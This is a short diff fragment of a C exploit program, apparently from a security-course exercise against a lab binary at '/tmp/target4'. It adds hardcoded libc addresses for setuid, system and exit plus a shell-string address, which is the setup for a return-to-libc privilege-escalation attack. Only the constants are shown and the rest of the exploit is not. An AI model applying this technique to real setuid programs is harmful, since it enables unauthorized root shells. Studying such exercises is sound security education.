@@ -7,6 +7,11 @@
 
 #define TARGET "/tmp/target4"
 
+static char setuid_addr[] = "\xe0\xa2\xeb\xb7";
+static char system_addr[] = "\xa0\x3d\xe4\xb7";
+static char exit_addr[] = "\xd0\x79\xe3\xb7";
+static char shell_addr[] = "\xe7\xff\xff\xbf";
+
 int main(void)
 {
   char *args[3]; 
